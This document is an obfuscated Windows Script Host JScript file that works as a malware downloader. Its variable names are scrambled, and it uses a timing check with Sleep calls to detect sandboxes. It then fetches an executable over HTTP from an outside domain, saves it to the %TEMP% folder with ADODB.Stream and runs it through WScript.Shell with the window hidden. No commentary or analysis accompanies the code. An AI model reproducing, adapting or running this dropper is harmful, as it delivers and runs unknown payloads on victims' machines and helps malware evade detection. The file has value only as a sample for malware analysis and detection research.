var _QW = false;
var _H0 = "CreateObject";
var _I1 = function _N() {return WScript[_H0]("WScript"+".Shell");}(), _RH = 11;
var _A = "MSXML2.XMLHTTP";
var _TD = 2123213;
var _AQ = 0;
function _C(_N0){_I1["Run"](_N0, _AQ, _AQ);};
function _D(){return _A + "";};
function _AF(_G, _AU){_AQ = _AQ * 1; return _G - _AU;};
function _QJ(){return _H0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _QW = true;
  @end
@*/
if (_QW)
{
var _V0 = "";
function _V(){return 22;};
var _BZ = 0; var _P = 0;
function _SQ()
{
var _L = new this["Date"]();
var _I0 = _L["getUTCMilliseconds"]();
WScript["Sleep"](_V());
var _L = new this["Date"]();
var _C0 = _L["getUTCMilliseconds"]();
WScript["Sleep"](_V());
var _L = new this["Date"]();
var _I = _L["getUTCMilliseconds"]();
var _BZ = "_H1";
_BZ = _AF(_C0, _I0);
var _P = "_FL";
_P = _AF(_I, _C0);
_V0 = "open";
return _AF(_BZ, _P);
}
var _K0 = false;
var _NZ = false;
for (var _MM = _AQ; _MM < _V() * 1; _MM++){if (_SQ() != _AQ){
_K0 = true; 
_P = "31" + 11 * _BZ + _P; 
_NZ = true; 
break;
}}
function _XI() {return ((_K0 == true) && (_K0 == _NZ)) ? 1 : _AQ;};
if (_K0 && _XI() && _NZ){
function _J() {return _I1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "HnQga3d3zrd0V.ex" + "e";};
 _J0 = _D();
 _Q = WScript[_H0](_J0);
 var _K = 1;
 while (_K){
try {
	if (_K == 1)
	{
		_Q[_V0]("GET", "http://srijanexportstowelwarmers.co.uk/k9owpa", false);
		_Q["send"]();
		_B = "Sleep";
	}
	WScript[_B](_V() + 120); 
	if (_Q["readystate"] < 2 * 2) continue;
	_K = _AQ;
	function _H(_JV) {var _PL = (1, 2, 3, 4, 5, _JV); return _PL;};
	_I2 = WScript[_QJ()]("ADODB.Stream");
	_J0 = _I2;
	_J0[_V0]();
	_J0["type"] = _H(1);
	_J0["write"](_Q["ResponseBody"]);
	_I2["position"] = _H(_AQ);
	_J0["Save" + "ToFile"](_J(), 2);
	_I2["cl"+"ose"]();
	_S = _J();
	_C(_S);
} catch(_B0){};
}
}
}

